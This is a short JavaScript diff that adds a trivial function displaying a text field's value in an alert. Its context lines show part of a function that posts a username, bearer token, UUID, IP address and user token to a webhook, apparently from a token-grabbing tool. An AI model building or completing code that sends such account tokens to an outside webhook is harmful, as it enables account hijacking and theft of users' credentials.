@@ -122,7 +122,10 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
 
-
+function returnText() {
+  let input = document.getElementById("userInput").value
+  alert(input)
+}
 
 const bannedNames = []
 
